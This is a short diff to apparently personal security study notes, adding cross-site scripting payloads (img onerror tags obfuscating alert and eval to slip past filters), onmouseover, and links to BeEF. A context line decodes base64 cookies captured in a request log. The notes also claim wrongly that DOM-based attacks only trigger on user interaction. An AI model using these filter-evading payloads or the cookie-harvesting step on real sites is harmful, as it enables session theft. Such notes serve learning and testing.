@@ -498,3 +498,12 @@ it was not working in a file
 * Phishing 
 * Port Scanning
 * `sed -n 's/GET \/?cookie=\(.*\)/\1/p' test | base64 -d`
+* window.location.host
+* dom-based attacks are only triggered when the user interact with an element of the dom, such as hovering an image.
+* onmouseover
+* <img src="aza" onerror="eval('aler'+'t')('Hello')">a
+* <img src="blah" onerror=alert('H'+'ello') />
+* <img src="blah" onerror=alert('HHelloello') />
+* <img src="blah" ONERROR=alert('H'+'ello') />
+* https://beefproject.com/
+* XSS-Payloads.com
